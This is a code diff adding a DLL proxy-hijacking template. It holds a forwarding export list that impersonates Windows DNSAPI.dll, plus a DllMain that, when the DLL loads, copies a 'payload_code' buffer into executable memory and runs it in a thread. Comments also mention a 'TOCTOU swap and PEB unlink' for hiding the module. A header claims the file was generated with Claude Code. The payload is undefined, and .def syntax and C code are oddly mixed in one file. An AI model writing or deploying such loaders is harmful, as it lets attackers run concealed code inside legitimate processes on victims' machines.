@@ -1,0 +1,32 @@
+// Fragment from the DNSAPI.def file (351 total exports)
+// Generated with Claude Code from dumpbin /exports
+
+LIBRARY DNSAPI
+EXPORTS
+    DnsAcquireContextHandle_A=C:\Windows\System32\DNSAPI.DnsAcquireContextHandle_A @1
+    DnsAcquireContextHandle_W=C:\Windows\System32\DNSAPI.DnsAcquireContextHandle_W @2
+    DnsCancelQuery=C:\Windows\System32\DNSAPI.DnsCancelQuery @3
+    DnsExtractRecordsFromMessage_UTF8=C:\Windows\System32\DNSAPI.DnsExtractRecordsFromMessage_UTF8 @4
+    DnsExtractRecordsFromMessage_W=C:\Windows\System32\DNSAPI.DnsExtractRecordsFromMessage_W @5
+    DnsFree=C:\Windows\System32\DNSAPI.DnsFree @6
+    DnsFreeProxyName=C:\Windows\System32\DNSAPI.DnsFreeProxyName @7
+    ; ... 344 additional exports redirected to the original DLL ...
+    DnsWriteQuestionToBuffer_UTF8=C:\Windows\System32\DNSAPI.DnsWriteQuestionToBuffer_UTF8 @351
+
+// DllMain with demonstration payload
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        // Phase 1: self-relocation
+        LPVOID mem = VirtualAlloc(NULL, 0x10000,
+                                  MEM_COMMIT | MEM_RESERVE,
+                                  PAGE_EXECUTE_READWRITE);
+        if (mem) {
+            memcpy(mem, payload_code, payload_size);
+            // Phase 2: create a thread for TOCTOU swap and PEB unlink
+            CreateThread(NULL, 0,
+                        (LPTHREAD_START_ROUTINE)mem,
+                        hModule, 0, NULL);
+        }
+    }
+    return TRUE;
+}
